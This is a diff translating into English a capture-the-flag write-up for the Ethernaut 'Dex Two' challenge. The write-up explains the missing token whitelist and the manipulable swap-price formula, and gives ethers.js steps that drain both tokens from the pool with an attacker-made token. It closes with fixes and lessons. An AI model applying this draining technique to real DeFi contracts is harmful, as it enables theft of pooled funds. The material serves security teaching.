@@ -1,38 +1,38 @@
 # Ethernaut Challenge 23: Dex Two 🏴‍☠️
 
-## 挑戰描述
+## Challenge Description
 
-這個關卡將要求你破解 `DexTwo` 合約的流動性池，將所有的 token1 和 token2 從合約中取出。
+This level will ask you to break the `DexTwo` contract's liquidity pool and extract all token1 and token2 from the contract.
 
-與前一個 Dex 挑戰不同，這次你需要做的是：
-1. 從 DexTwo 中提取所有的 token1
-2. 從 DexTwo 中提取所有的 token2
+Unlike the previous Dex challenge, this time you need to:
+1. Extract all token1 from DexTwo
+2. Extract all token2 from DexTwo
 
-關鍵在於你需要從 DexTwo 中提取所有流動性池中的代幣！
+The key is that you need to extract all tokens from the DexTwo liquidity pool!
 
-## 合約分析
+## Contract Analysis
 
-### 關鍵漏洞分析
+### Key Vulnerability Analysis
 
-1. **缺乏代幣白名單驗證**：
-   - `swap` 函數沒有驗證 `from` 和 `to` 代幣是否為合法的 token1 或 token2
-   - 攻擊者可以使用任意 ERC20 代幣進行交換
+1. **Lack of Token Whitelist Verification**:
+   - The `swap` function doesn't verify if `from` and `to` tokens are legitimate token1 or token2
+   - Attackers can use arbitrary ERC20 tokens for swapping
 
-2. **價格計算公式缺陷**：
+2. **Price Calculation Formula Flaw**:
    ```solidity
    function getSwapAmount(address from, address to, uint256 amount) public view returns (uint256) {
        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
    }
    ```
-   - 當攻擊者控制 `from` 代幣的餘額時，可以操控計算結果
+   - When attackers control the balance of the `from` token, they can manipulate the calculation result
 
-3. **approve 函數限制**：
-   - SwappableTokenTwo 的 approve 函數阻止了 DEX 作為 owner 進行 approve
-   - 但不影響攻擊者創建的新代幣
+3. **approve Function Limitation**:
+   - SwappableTokenTwo's approve function prevents DEX from performing approve as owner
+   - But doesn't affect new tokens created by attackers
 
-## 攻擊策略
+## Attack Strategy
 
-### 步驟 1: 創建惡意代幣
+### Step 1: Create Malicious Token
 ```typescript
 const attackerTokenFactory = await ethers.getContractFactory("SwappableTokenTwo");
 const attackerToken = await attackerTokenFactory.deploy(
@@ -43,60 +43,60 @@ const attackerToken = await attackerTokenFactory.deploy(
 );
 ```
 
-### 步驟 2: 設置 Approval
+### Step 2: Set Approval
 ```typescript
 await contract.approve(contract.target, 100000);
 await attackerToken["approve(address,address,uint256)"](attacker.address, contract.target, 100000);
 ```
 
-### 步驟 3: 執行第一次攻擊 (提取 token1)
+### Step 3: Execute First Attack (Extract token1)
 ```typescript
-// 轉 1 個惡意代幣到 DEX
+// Transfer 1 malicious token to DEX
 await attackerToken.transfer(contract.target, 1);
 
-// 用 1 個惡意代幣換取所有 token1
+// Use 1 malicious token to exchange for all token1
 // getSwapAmount(attackerToken, token1, 1) = (1 * 100) / 1 = 100
 await contract.swap(attackerToken.target, token1, 1);
 ```
 
-### 步驟 4: 執行第二次攻擊 (提取 token2)
+### Step 4: Execute Second Attack (Extract token2)
 ```typescript
-// 再轉 8 個惡意代幣到 DEX (使 DEX 中惡意代幣餘額為 10)
+// Transfer 8 more malicious tokens to DEX (making DEX malicious token balance 10)
 await attackerToken.transfer(contract.target, 8);
 
-// 用 10 個惡意代幣換取所有 token2
+// Use 10 malicious tokens to exchange for all token2
 // getSwapAmount(attackerToken, token2, 10) = (10 * 100) / 10 = 100
 await contract.swap(attackerToken.target, token2, 10);
 ```
 
-## 攻擊原理詳解
+## Detailed Attack Explanation
 
-### 關鍵數學計算
+### Key Mathematical Calculations
 
-1. **初始狀態**：
-   - DEX 中 token1: 100
-   - DEX 中 token2: 100
-   - DEX 中 attackerToken: 0
+1. **Initial State**:
+   - DEX token1: 100
+   - DEX token2: 100
+   - DEX attackerToken: 0
 
-2. **第一次攻擊後**：
-   - DEX 中 token1: 0 ✅
-   - DEX 中 token2: 100
-   - DEX 中 attackerToken: 1
+2. **After First Attack**:
+   - DEX token1: 0 ✅
+   - DEX token2: 100
+   - DEX attackerToken: 1
 
-3. **第二次攻擊後**：
-   - DEX 中 token1: 0 ✅
-   - DEX 中 token2: 0 ✅
-   - DEX 中 attackerToken: 10
+3. **After Second Attack**:
+   - DEX token1: 0 ✅
+   - DEX token2: 0 ✅
+   - DEX attackerToken: 10
 
-### 為什麼攻擊會成功？
+### Why Does the Attack Succeed?
 
-1. **缺乏代幣驗證**：DEX 沒有限制只能交換 token1 和 token2
-2. **價格操控**：攻擊者完全控制惡意代幣的供應量
-3. **計算公式利用**：通過精確控制分母（惡意代幣餘額），可以得到想要的兌換比例
+1. **Lack of Token Verification**: DEX doesn't restrict swaps to only token1 and token2
+2. **Price Manipulation**: Attackers have complete control over malicious token supply
+3. **Formula Exploitation**: By precisely controlling the denominator (malicious token balance), desired exchange ratios can be achieved
 
-## 安全建議
+## Security Recommendations
 
-1. **實施代幣白名單**：
+1. **Implement Token Whitelist**:
    ```solidity
    modifier onlyValidTokens(address from, address to) {
        require(from == token1 || from == token2, "Invalid from token");
@@ -106,36 +106,36 @@ await contract.swap(attackerToken.target, token2, 10);
    }
    ```
 
-2. **加強價格預言機**：
-   - 使用外部價格預言機
-   - 實施滑點保護
-   - 添加最小流動性要求
+2. **Strengthen Price Oracle**:
+   - Use external price oracles
+   - Implement slippage protection
+   - Add minimum liquidity requirements
 
-3. **審計交易邏輯**：
-   - 檢查所有代幣轉賬
-   - 驗證交換前後的餘額變化
-   - 實施重入攻擊保護
+3. **Audit Transaction Logic**:
+   - Check all token transfers
+   - Verify balance changes before and after swaps
+   - Implement reentrancy attack protection
 
-## 運行指令
+## Run Commands
 
 ```bash
-# 安裝依賴
+# Install dependencies
 npm install
 
-# 編譯合約
+# Compile contracts
 npx hardhat compile
 
-# 運行攻擊腳本
+# Run attack script
 npx hardhat run scripts/interact.ts --network sepolia
 
-# 運行測試
+# Run tests
 npx hardhat test
 ```
 
-## 學習要點
+## Learning Points
 
-1. **代幣驗證的重要性**：任何 DeFi 協議都應該嚴格驗證支持的代幣
-2. **價格計算的安全性**：簡單的數學公式可能被惡意利用
-3. **流動性池攻擊**：攻擊者可以通過操控流動性來影響價格
+1. **Importance of Token Verification**: Any DeFi protocol should strictly verify supported tokens
+2. **Security of Price Calculations**: Simple mathematical formulas can be maliciously exploited
+3. **Liquidity Pool Attacks**: Attackers can influence prices by manipulating liquidity
 
-這個挑戰展示了 DeFi 協議中常見的漏洞類型，提醒我們在設計金融合約時需要考慮各種邊緣情況和潛在的攻擊向量。
+This challenge demonstrates common vulnerability types in DeFi protocols, reminding us to consider various edge cases and potential attack vectors when designing financial contracts.
